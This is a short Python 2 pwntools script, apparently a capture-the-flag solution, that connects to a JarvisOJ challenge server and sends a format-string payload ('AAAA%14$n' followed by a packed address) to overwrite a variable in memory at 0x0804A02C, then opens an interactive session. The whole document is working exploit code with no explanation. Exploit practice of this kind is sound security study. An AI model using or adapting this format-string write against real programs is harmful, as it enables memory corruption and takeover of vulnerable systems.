#!/usr/bin/env python2
from pwn import *

x_addr = 0x0804A02C
conn = remote('pwn2.jarvisoj.com', 9895)

conn.send_raw('AAAA%14$nAAA' + pack(x_addr, 32))
conn.interactive()

